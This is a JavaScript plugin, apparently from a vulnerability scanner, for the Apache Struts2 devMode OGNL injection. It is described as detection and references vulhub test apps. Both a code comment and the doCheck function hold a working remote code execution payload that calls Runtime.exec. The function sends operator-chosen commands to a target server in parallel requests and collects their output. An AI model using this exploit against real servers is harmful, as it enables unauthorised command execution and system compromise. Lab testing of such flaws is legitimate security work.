module.exports={
	tags:"struts2,devMode",
	des:"struts2 devModeVulnerability detection",
	dependencies:"",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-devMode",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-037.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-devMode"],
	toRst:{},
/*
http://127.0.0.1:8080/orders/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id

*/
	doCheck:function (url,fnCbk)
	{

		// 比较特殊，所以需要截取
		var _t = this,ss,_s = _t.self,n = url.lastIndexOf('/'),szUrl = url.substr(0, 14 < n? n : url.length);
		
		szUrl = szUrl.replace(/\?.*$/gmi,'');
		if(14 > szUrl.length)
		{
			_s.log("错误的url: " + szUrl);
			return fnCbk();
		}
		var fnC = function(szCmd,fnCbk1)
		{
			var s = "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=" + szCmd;
			ss = s;
			s = _s.fnUrlEncode2(s);
			// console.log([url, szUrl + "/?"+ s]);
			_s.request(_s.fnOptHeader({method: 'GET',uri: szUrl + "/?"+ s
			    })
			  , function (error, response, body)
			   {
			   		_s.error(error);
			   		_s.fnShowBody(body);
			   		try{if("function" == typeof fnCbk1)fnCbk1(body || error);}catch(e){}
			    }
			  );
		};
		var a = _s.g_szCmd.split(";"),aR = [],nC = 0;
		_s.async.mapLimit(a,_s.g_nThread,function(szCmd1,fnCbk2)
		{//  +"|base64"
			fnC(szCmd1,function(b)
			{
				var rg = /\{\{([^\}]+?)\}\}/gmi;
				rg = rg.exec(b);
				if(rg)b = rg[1];
				var n = a.indexOf(szCmd1);
				aR[n] = b;
				nC++;
				// console.log(n + " = " + b);
				if(a.length == nC)
				{
					_s.fnDoBody(aR.join(""),"s2-devMode",url,null,function(o)
			    	{
			    		var r = {"url":szUrl,"send":ss};
		  				fnCbk(_s.copyO2O(r,o),_t);
			    	});
				}
				fnCbk2();	
			});
		});
	}
};